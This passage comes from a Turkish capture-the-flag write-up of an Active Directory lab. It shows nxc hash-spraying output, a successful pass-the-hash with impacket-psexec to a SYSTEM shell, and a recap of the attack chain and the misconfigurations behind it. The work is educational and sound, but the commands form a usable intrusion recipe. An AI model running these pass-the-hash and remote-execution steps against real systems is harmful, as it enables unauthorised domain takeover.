SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\BackupServer$:46a4655f18def136b3bfab7b0b4e70e3 STATUS_LOGON_FAILURE
                                                                                                                     
┌──(root㉿kali)-[~/thm/soupedecode]
└─# nxc smb 10.114.157.19 -u 'DatabaseServer$' -H '406b424c7b483a42458bf6f545c936f7'                         
SMB         10.114.157.19   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE
                                                                                                                     
┌──(root㉿kali)-[~/thm/soupedecode]
└─# nxc smb 10.114.157.19 -u 'CitrixServer$' -H '48fc7eca9af236d7849273990f6c5117'                           
SMB         10.114.157.19   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.114.157.19   445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE
                                                                                                                     
┌──(root㉿kali)-[~/thm/soupedecode]
└─# nxc smb 10.114.157.19 -u 'FileServer$' -H 'e41da7e79a4c76dbd9cf79d1cb325559'         
SMB         10.114.157.19   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:None)
SMB         10.114.157.19   445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
                                                                                                                     
┌──(root㉿kali)-[~/thm/soupedecode]
└─# 
```

Sonuç:

```
(Pwn3d!)
```

Machine account hâlâ aktif.

Daha önemlisi ADMIN$ paylaşımına erişebiliyor.

Bu da uzaktan kod çalıştırabileceğimiz anlamına geliyor.

---

# Remote Code Execution

Pass-the-Hash ile PsExec kullanıyorum.

```bash
──(root㉿kali)-[~/thm/soupedecode]
└─# impacket-psexec 'soupedecode.local/FileServer$'@10.114.157.19 -hashes ':e41da7e79a4c76dbd9cf79d1cb325559'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.114.157.19.....
[*] Found writable share ADMIN$
[*] Uploading file VWEMKUOd.exe
[*] Opening SVCManager on 10.114.157.19.....
[*] Creating service zCpQ on 10.114.157.19.....
[*] Starting service zCpQ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.587]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
27cb2be302c388d63d27c86bfdd5f56a

C:\Windows\system32>
```

Artık SYSTEM yetkisine sahibiz.

---

# Attack Path

```
Guest Enumeration
        │
        ▼
RID Bruteforce
        │
        ▼
Username List
        │
        ▼
Username = Password
        │
        ▼
ybob317
        │
        ▼
Kerberoasting
        │
        ▼
file_svc
        │
        ▼
Backup Share
        │
        ▼
Machine Account Hashes
        │
        ▼
Pass-the-Hash
        │
        ▼
FileServer$
        │
        ▼
PsExec
        │
        ▼
NT AUTHORITY\SYSTEM
```

---

# Öğrenilen Noktalar

Bu makinede zincir tamamen küçük güvenlik hatalarının birleşmesinden oluşuyor.

- Guest hesabı üzerinden RID Enumeration yapılabiliyor.
- Kullanıcılardan biri username=password kullanıyor.
- Servis hesabı zayıf parola kullanıyor ve Kerberoast edilebiliyor.
- Backup paylaşımı hassas NTLM hashleri içeriyor.
- Machine account hashlerinden biri hâlâ geçerli.
- Machine account uzaktan yönetim yetkisine sahip olduğu için Pass-the-Hash ile SYSTEM erişimi elde edilebiliyor.

Tek başına kritik görünmeyen yapılandırma hataları birleştiğinde tam domain ele geçirilmesine kadar giden bir saldırı zinciri oluşturabiliyor.

---

# Sonuç

Bu oda özellikle aşağıdaki Active Directory saldırı tekniklerini pratik etmek için oldukça güzel bir senaryo sunuyor.

- RID Bruteforce
- SMB Enumeration
- Password Spraying
- Kerberoasting
- Hash Cracking
- SMB Share Enumeration
- Pass-the-Hash
- PsExec ile Remote Code Execution
